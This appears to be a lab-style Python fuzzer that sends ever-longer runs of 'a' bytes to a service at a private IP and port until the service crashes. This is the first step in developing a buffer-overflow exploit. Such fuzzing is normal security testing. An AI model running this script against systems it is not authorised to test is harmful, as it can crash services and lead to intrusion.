import sys, socket
from time import sleep

endpointIp = '192.168.1.141'
endpointPort = 31337

buffer = b'a' * 100

while True:
	try:
		payload = buffer + b'\r\n'
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((endpointIp, endpointPort))
		print('Sending Payload of ' + str(len(buffer)) + ' bytes')
		s.send(payload)
		s.close()
		sleep(1)
		buffer = buffer + b'a' * 100
	except:
		print('Fuzzing crashed at ' + str(len(buffer)) + ' bytes')
		sys.exit()